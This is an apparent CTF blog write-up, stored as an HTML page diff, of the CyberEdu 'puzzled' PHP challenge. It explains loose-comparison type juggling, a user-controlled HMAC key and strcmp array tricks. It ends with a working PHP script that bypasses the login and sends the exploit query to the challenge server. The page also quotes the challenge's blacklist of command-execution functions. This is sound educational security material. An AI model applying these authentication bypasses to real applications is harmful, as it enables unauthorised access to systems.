@@ -1,0 +1,450 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>CyberEdu puzzled Writeup | Irina&#39;s CTF Writeups</title>
+<meta name="keywords" content="CyberEdu, web">
+<meta name="description" content="Challenge overview
+How puzzled can you get with php?
+
+I really didn&rsquo;t feel like doing php challenges but I did it anyways.
+Identifying the vulnerabilities
+We get a php source file with what looks like login. If we don&rsquo;t provide a pass, the source gets leaked.
+if (isset($_GET[&#39;pass&#39;])){
+    $pass = generateRandomString(95);
+    $user_input = json_decode($_GET[&#39;pass&#39;]);
+    if ($pass != $user_input-&gt;pass) {
+        header(&#39;HTTP/1.0 403 Forbidden&#39;);
+        exit;
+    }
+They generate a random 95 letter long password, decode the json of our pass, and hit us with a 403 if the password isn&rsquo;t correct. But the comparison is done with !=, not !==. For example, 5!=&quot;5&quot; would return false, while 5!==&quot;5&quot; would return true.">
+<meta name="author" content="">
+<link rel="canonical" href="https://irinasusca.github.io/writeup-blog/posts/puzzled-writeup/">
+<link crossorigin="anonymous" href="/writeup-blog/assets/css/stylesheet.343cc480b9ffc8f04ccbe5e968ad674880cab773ec19905e93033065c1e7a804.css" integrity="sha256-NDzEgLn/yPBMy&#43;XpaK1nSIDKt3PsGZBekwMwZcHnqAQ=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://irinasusca.github.io/writeup-blog/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://irinasusca.github.io/writeup-blog/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://irinasusca.github.io/writeup-blog/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://irinasusca.github.io/writeup-blog/apple-touch-icon.png">
+<link rel="mask-icon" href="https://irinasusca.github.io/writeup-blog/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://irinasusca.github.io/writeup-blog/posts/puzzled-writeup/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><meta property="og:url" content="https://irinasusca.github.io/writeup-blog/posts/puzzled-writeup/">
+  <meta property="og:site_name" content="Irina&#39;s CTF Writeups">
+  <meta property="og:title" content="CyberEdu puzzled Writeup">
+  <meta property="og:description" content="Challenge overview How puzzled can you get with php?
+I really didn’t feel like doing php challenges but I did it anyways.
+Identifying the vulnerabilities We get a php source file with what looks like login. If we don’t provide a pass, the source gets leaked.
+if (isset($_GET[&#39;pass&#39;])){ $pass = generateRandomString(95); $user_input = json_decode($_GET[&#39;pass&#39;]); if ($pass != $user_input-&gt;pass) { header(&#39;HTTP/1.0 403 Forbidden&#39;); exit; } They generate a random 95 letter long password, decode the json of our pass, and hit us with a 403 if the password isn’t correct. But the comparison is done with !=, not !==. For example, 5!=&#34;5&#34; would return false, while 5!==&#34;5&#34; would return true.">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-01-18T00:00:00+00:00">
+    <meta property="article:modified_time" content="2026-01-18T00:00:00+00:00">
+    <meta property="article:tag" content="CyberEdu">
+    <meta property="article:tag" content="Web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="CyberEdu puzzled Writeup">
+<meta name="twitter:description" content="Challenge overview
+How puzzled can you get with php?
+
+I really didn&rsquo;t feel like doing php challenges but I did it anyways.
+Identifying the vulnerabilities
+We get a php source file with what looks like login. If we don&rsquo;t provide a pass, the source gets leaked.
+if (isset($_GET[&#39;pass&#39;])){
+    $pass = generateRandomString(95);
+    $user_input = json_decode($_GET[&#39;pass&#39;]);
+    if ($pass != $user_input-&gt;pass) {
+        header(&#39;HTTP/1.0 403 Forbidden&#39;);
+        exit;
+    }
+They generate a random 95 letter long password, decode the json of our pass, and hit us with a 403 if the password isn&rsquo;t correct. But the comparison is done with !=, not !==. For example, 5!=&quot;5&quot; would return false, while 5!==&quot;5&quot; would return true.">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://irinasusca.github.io/writeup-blog/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "CyberEdu puzzled Writeup",
+      "item": "https://irinasusca.github.io/writeup-blog/posts/puzzled-writeup/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "CyberEdu puzzled Writeup",
+  "name": "CyberEdu puzzled Writeup",
+  "description": "Challenge overview How puzzled can you get with php?\nI really didn\u0026rsquo;t feel like doing php challenges but I did it anyways.\nIdentifying the vulnerabilities We get a php source file with what looks like login. If we don\u0026rsquo;t provide a pass, the source gets leaked.\nif (isset($_GET[\u0026#39;pass\u0026#39;])){ $pass = generateRandomString(95); $user_input = json_decode($_GET[\u0026#39;pass\u0026#39;]); if ($pass != $user_input-\u0026gt;pass) { header(\u0026#39;HTTP/1.0 403 Forbidden\u0026#39;); exit; } They generate a random 95 letter long password, decode the json of our pass, and hit us with a 403 if the password isn\u0026rsquo;t correct. But the comparison is done with !=, not !==. For example, 5!=\u0026quot;5\u0026quot; would return false, while 5!==\u0026quot;5\u0026quot; would return true.\n",
+  "keywords": [
+    "CyberEdu", "web"
+  ],
+  "articleBody": "Challenge overview How puzzled can you get with php?\nI really didn’t feel like doing php challenges but I did it anyways.\nIdentifying the vulnerabilities We get a php source file with what looks like login. If we don’t provide a pass, the source gets leaked.\nif (isset($_GET['pass'])){ $pass = generateRandomString(95); $user_input = json_decode($_GET['pass']); if ($pass != $user_input-\u003epass) { header('HTTP/1.0 403 Forbidden'); exit; } They generate a random 95 letter long password, decode the json of our pass, and hit us with a 403 if the password isn’t correct. But the comparison is done with !=, not !==. For example, 5!=\"5\" would return false, while 5!==\"5\" would return true.\nSo we can bypass this by the php \"string\" == 0 vulnerability.\nThe next part:\nif ($user_input-\u003etoken != $secret_token) {; echo strlen($secret_token); header('HTTP/1.0 403 Forbidden'); exit; } If we get the token wrong, we get the length of it.\nNext, we can provide a key parameter, which becomes the result of hash_hmac('ripemd160', param_key, secret_token).\n$key = $secret_token; if (isset($_GET['key'])) { $key = hash_hmac('ripemd160', $_GET['key'], $secret_token); } $hash = hash_hmac('ripemd160', $user_input-\u003echeck, $key); if ($hash !== $user_input-\u003ehash) { header('HTTP/1.0 403 Forbidden'); exit; } If we don’t get the hash right, we get another 403.\nThen, a blacklist:\n$black = ['system', 'exec', 'eval', 'php', 'passthru', 'open', 'assert', '`', 'preg_replace', 'e(', 'n(', '$', '(', '%', '=', '%28']; And then - unserialize!\n$login = unserialize($user_input-\u003echeck); And finally, after we get admin, to finally get the flag, we need to bypass this:\nif($admin){ if (isset($_GET['something'])) { if (strcmp($_GET['something'], $secret_token) == 0) { echo $flag; } else { echo 'Try Harder!'; } } } Our pass gets json decoded into $user_input. So we need to pass pass (haha) as a parameter containing the json values $user_input-\u003epass, $user_input-\u003etoken, $user_input-\u003echeck, $user_input-\u003ehash, and then also pass the key as a param.\nThis ripemd160 is just a 160-bit or 40-hex-char long HMAC (Hash-based Message Authentication Code).\nHMACs combine a secret key, a message and a hash function to produce a signature. A HMAC should be called like this: hmac(algo, data, key).\nWhat they’ve done is a bad idea because we control a lot of stuff.\n$key = HMAC(secret token, key_param) OR $key = $secret_token THEN\n$hash = HMAC($user_input-\u003echeck, $key)\nwhere result = HMAC(key, message).\nI sent a placeholder for a pass json with \"pass\": 0 and it bypassed the check! We get back the secret token length:\nThis didn’t work on token though. Instead, I used GET /?pass={\"pass\": 0,\"token\": true,\"check\": \"\",\"hash\": \"\"} and just got a 403. But we still need to get hash. It doesn’t have a loose comparison (!=) like the other ones, so what do we do?\nSo we need another way to figure secret_token out, or control the hash.\nLearning about this felt so dreadful to me I put this aside for two days. I even started doing math, just to delay finishing this. But now I’m back.\nI found another great source about HMACs here. Another one about php vulns.\nThe most important thing we can do while solving these challenges is learn about the underlying mechanisms.\nAlthough it’s possible to force a hash_hmac(‘ripemd160’, null, key), that wouldn’t help us that much. Instead, what would is sending a null key!\nI got stuck around here, so I found this helpful writeup. The solution this guy found to sending a null key was making it an empty array.\npass: pass: 0 token: true check: user: true pass: true hash: hash_hmac('ridemd160', check, key) key[]: '' Since key is going to be null, we can calculate the hash ourselves. And keep in mind, check is a serialized php object: $login = unserialize($user_input-\u003echeck);\nWe can start working on a script in php, since it would be easier than trying to do it in python. Finally no more 403, but we still have one last step, which is the something param.\nif (strcmp($_GET['something'], $secret_token) == 0) { echo $flag; The same bypass that worked for key, worked for this - sending it as a null array - and we finally get the flag!\nHere is the final version of the script:\n\u003c?php $url = \"http://34.40.105.109:32124\"; $login_data = [ 'user' =\u003e true, 'pass' =\u003e true ]; $check = serialize($login_data); $empty_key = ''; $hash = hash_hmac('ripemd160', $check, $empty_key); $json_payload = [ 'pass' =\u003e 0, 'token' =\u003e true, 'check' =\u003e $check, 'hash' =\u003e $hash ]; $pass_param = json_encode($json_payload); $params = [ 'pass' =\u003e $pass_param, 'key[]' =\u003e '', 'something[]' =\u003e '' ]; $full_url = $url . '?' . http_build_query($params); $response = file_get_contents($full_url); echo \"\\n[+] Response:\\n$response\\n\"; ?\u003e I also uploaded the full code here!\n",
+  "wordCount" : "757",
+  "inLanguage": "en",
+  "datePublished": "2026-01-18T00:00:00Z",
+  "dateModified": "2026-01-18T00:00:00Z",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://irinasusca.github.io/writeup-blog/posts/puzzled-writeup/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Irina's CTF Writeups",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://irinasusca.github.io/writeup-blog/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://irinasusca.github.io/writeup-blog/" accesskey="h" title="Irina&#39;s CTF Writeups (Alt + H)">Irina&#39;s CTF Writeups</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://irinasusca.github.io/writeup-blog/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://irinasusca.github.io/writeup-blog/posts/" title="Posts">
+                    <span>Posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://irinasusca.github.io/writeup-blog/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      CyberEdu puzzled Writeup
+    </h1>
+    <div class="post-meta"><span title='2026-01-18 00:00:00 +0000 UTC'>January 18, 2026</span>
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#challenge-overview" aria-label="Challenge overview">Challenge overview</a></li>
+                <li>
+                    <a href="#identifying-the-vulnerabilities" aria-label="Identifying the vulnerabilities">Identifying the vulnerabilities</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h2 id="challenge-overview">Challenge overview<a hidden class="anchor" aria-hidden="true" href="#challenge-overview">#</a></h2>
+<p>How puzzled can you get with php?</p>
+<hr>
+<p>I really didn&rsquo;t feel like doing php challenges but I did it anyways.</p>
+<h2 id="identifying-the-vulnerabilities">Identifying the vulnerabilities<a hidden class="anchor" aria-hidden="true" href="#identifying-the-vulnerabilities">#</a></h2>
+<p>We get a <code>php</code> source file with what looks like login. If we don&rsquo;t provide a pass, the source gets leaked.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;pass&#39;</span>])){
+</span></span><span style="display:flex;"><span>    $pass <span style="color:#f92672">=</span> <span style="color:#a6e22e">generateRandomString</span>(<span style="color:#ae81ff">95</span>);
+</span></span><span style="display:flex;"><span>    $user_input <span style="color:#f92672">=</span> <span style="color:#a6e22e">json_decode</span>($_GET[<span style="color:#e6db74">&#39;pass&#39;</span>]);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ($pass <span style="color:#f92672">!=</span> $user_input<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">pass</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;HTTP/1.0 403 Forbidden&#39;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">exit</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p>They generate a random 95 letter long password, decode the json of our <code>pass</code>, and hit us with a 403 if the password isn&rsquo;t correct. But the comparison is done with <code>!=</code>, not <code>!==</code>. For example, <code>5!=&quot;5&quot;</code> would return false, while <code>5!==&quot;5&quot;</code> would return true.</p>
+<p>So we can bypass this by the php <code>&quot;string&quot; == 0</code> vulnerability.</p>
+<p>The next part:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ($user_input<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">token</span> <span style="color:#f92672">!=</span> $secret_token) {;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">strlen</span>($secret_token);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;HTTP/1.0 403 Forbidden&#39;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">exit</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>If we get the token wrong, we get the length of it.</p>
+<p>Next, we can provide a <code>key</code> parameter, which becomes the result of <code>hash_hmac('ripemd160', param_key, secret_token)</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$key <span style="color:#f92672">=</span> $secret_token;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;key&#39;</span>])) {
+</span></span><span style="display:flex;"><span>    $key <span style="color:#f92672">=</span> <span style="color:#a6e22e">hash_hmac</span>(<span style="color:#e6db74">&#39;ripemd160&#39;</span>, $_GET[<span style="color:#e6db74">&#39;key&#39;</span>], $secret_token); 
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$hash <span style="color:#f92672">=</span> <span style="color:#a6e22e">hash_hmac</span>(<span style="color:#e6db74">&#39;ripemd160&#39;</span>, $user_input<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">check</span>, $key);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ($hash <span style="color:#f92672">!==</span> $user_input<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">hash</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;HTTP/1.0 403 Forbidden&#39;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">exit</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>If we don&rsquo;t get the hash right, we get another 403.</p>
+<p>Then, a blacklist:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$black <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;system&#39;</span>, <span style="color:#e6db74">&#39;exec&#39;</span>, <span style="color:#e6db74">&#39;eval&#39;</span>, <span style="color:#e6db74">&#39;php&#39;</span>, <span style="color:#e6db74">&#39;passthru&#39;</span>, <span style="color:#e6db74">&#39;open&#39;</span>, <span style="color:#e6db74">&#39;assert&#39;</span>, <span style="color:#e6db74">&#39;`&#39;</span>, <span style="color:#e6db74">&#39;preg_replace&#39;</span>, <span style="color:#e6db74">&#39;e(&#39;</span>, <span style="color:#e6db74">&#39;n(&#39;</span>, <span style="color:#e6db74">&#39;$&#39;</span>, <span style="color:#e6db74">&#39;(&#39;</span>, <span style="color:#e6db74">&#39;%&#39;</span>, <span style="color:#e6db74">&#39;=&#39;</span>, <span style="color:#e6db74">&#39;%28&#39;</span>];
+</span></span></code></pre></div><p>And then - unserialize!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$login <span style="color:#f92672">=</span> <span style="color:#a6e22e">unserialize</span>($user_input<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">check</span>);
+</span></span></code></pre></div><p>And finally, after we get admin, to finally get the flag, we need to bypass this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">if</span>($admin){
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;something&#39;</span>])) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strcmp</span>($_GET[<span style="color:#e6db74">&#39;something&#39;</span>], $secret_token) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">echo</span> $flag;
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;Try Harder!&#39;</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Our pass gets json decoded into <code>$user_input</code>. So we need to pass <code>pass</code> (haha) as a parameter containing the json values <code>$user_input-&gt;pass</code>, <code>$user_input-&gt;token</code>, <code>$user_input-&gt;check</code>, <code>$user_input-&gt;hash</code>, and then also pass the <code>key</code> as a param.</p>
+<p>This <em>ripemd160</em> is just a 160-bit or 40-hex-char long <a href="https://abhaybhargav.medium.com/security-engineer-interview-questions-whats-an-hmac-aaf6406e5897">HMAC</a> (Hash-based Message Authentication Code).</p>
+<p>HMACs combine a secret key, a message and a hash function to produce a signature. A HMAC should be called like this: <code>hmac(algo, data, key)</code>.</p>
+<p>What they&rsquo;ve done is a bad idea because we control a lot of stuff.</p>
+<p><code>$key = HMAC(secret token, key_param)</code> OR <code>$key = $secret_token</code> THEN</p>
+<p><code>$hash = HMAC($user_input-&gt;check, $key)</code></p>
+<p>where <code>result = HMAC(key, message)</code>.</p>
+<p>I sent a placeholder for a pass json with <code>&quot;pass&quot;: 0</code> and it bypassed the check! We get back the secret token length:</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/puzzled-writeup/len.png#center"></p>
+<p>This didn&rsquo;t work on token though. Instead, I used  <code>GET /?pass={&quot;pass&quot;: 0,&quot;token&quot;: true,&quot;check&quot;: &quot;&quot;,&quot;hash&quot;: &quot;&quot;}</code> and just got a 403. But we still need to get hash. It doesn&rsquo;t have a loose comparison (!=) like the other ones, so what do we do?</p>
+<p>So we need another way to figure secret_token out, or control the hash.</p>
+<hr>
+<p>Learning about this felt so dreadful to me I put this aside for two days. I even started doing math, just to delay finishing this. But now I&rsquo;m back.</p>
+<p>I found another great source about HMACs <a href="https://blog.gitguardian.com/hmac-secrets-explained-authentication/">here</a>. Another one about <a href="https://angelica.gitbook.io/hacktricks/network-services-pentesting/pentesting-web/php-tricks-esp">php vulns</a>.</p>
+<p>The most important thing we can do while solving these challenges is learn about the underlying mechanisms.</p>
+<hr>
+<p>Although it&rsquo;s possible to force a hash_hmac(&lsquo;ripemd160&rsquo;, <strong>null</strong>, key), that wouldn&rsquo;t help us that much. Instead, what would is sending a null key!</p>
+<p>I got stuck around here, so I found <a href="https://jorgectf.github.io/blog/post/cyberedu-web-challenges/#puzzled">this helpful writeup</a>. The solution this guy found to sending a null key was making it an empty array.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">pass</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">pass</span>: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    token: true
+</span></span><span style="display:flex;"><span>    check: 
+</span></span><span style="display:flex;"><span>        user: true
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">pass</span>: true
+</span></span><span style="display:flex;"><span>    hash: hash_hmac(<span style="color:#e6db74">&#39;ridemd160&#39;</span>, check, key)
+</span></span><span style="display:flex;"><span>key[]: <span style="color:#e6db74">&#39;&#39;</span>
+</span></span></code></pre></div><p>Since <code>key</code> is going to be null, we can calculate the hash ourselves. And keep in mind, <code>check</code> is a serialized php object: <code>$login = unserialize($user_input-&gt;check);</code></p>
+<p>We can start working on a script in php, since it would be easier than trying to do it in python. Finally no more 403, but we still have one last step, which is the <em>something</em> param.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strcmp</span>($_GET[<span style="color:#e6db74">&#39;something&#39;</span>], $secret_token) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">echo</span> $flag;
+</span></span></code></pre></div><p>The same bypass that worked for key, worked for this - sending it as a null array - and we finally get the flag!</p>
+<p>Here is the final version of the script:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://34.40.105.109:32124&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$login_data <span style="color:#f92672">=</span> [
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#39;user&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">true</span>,
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#39;pass&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">true</span>
+</span></span><span style="display:flex;"><span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$check <span style="color:#f92672">=</span> <span style="color:#a6e22e">serialize</span>($login_data);
+</span></span><span style="display:flex;"><span>$empty_key <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>;
+</span></span><span style="display:flex;"><span>$hash <span style="color:#f92672">=</span> <span style="color:#a6e22e">hash_hmac</span>(<span style="color:#e6db74">&#39;ripemd160&#39;</span>, $check, $empty_key);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$json_payload <span style="color:#f92672">=</span> [
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#39;pass&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#ae81ff">0</span>,
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#39;token&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">true</span>,
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#39;check&#39;</span> <span style="color:#f92672">=&gt;</span> $check,
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#39;hash&#39;</span> <span style="color:#f92672">=&gt;</span> $hash
+</span></span><span style="display:flex;"><span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$pass_param <span style="color:#f92672">=</span> <span style="color:#a6e22e">json_encode</span>($json_payload);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$params <span style="color:#f92672">=</span> [
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#39;pass&#39;</span> <span style="color:#f92672">=&gt;</span> $pass_param,
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#39;key[]&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;&#39;</span>,
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#39;something[]&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$full_url <span style="color:#f92672">=</span> $url <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;?&#39;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">http_build_query</span>($params);
+</span></span><span style="display:flex;"><span>$response <span style="color:#f92672">=</span> <span style="color:#a6e22e">file_get_contents</span>($full_url);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[+] Response:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">$response\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/puzzled-writeup/flag.png#center"></p>
+<hr>
+<p>I also uploaded the full code <a href="https://github.com/irinasusca/ctf-writeups/blob/main/cyberedu/puzzled.php">here</a>!</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://irinasusca.github.io/writeup-blog/tags/cyberedu/">CyberEdu</a></li>
+      <li><a href="https://irinasusca.github.io/writeup-blog/tags/web/">Web</a></li>
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="https://irinasusca.github.io/writeup-blog/">Irina&#39;s CTF Writeups</a></span> · 
+
+    <span>
+        Powered by
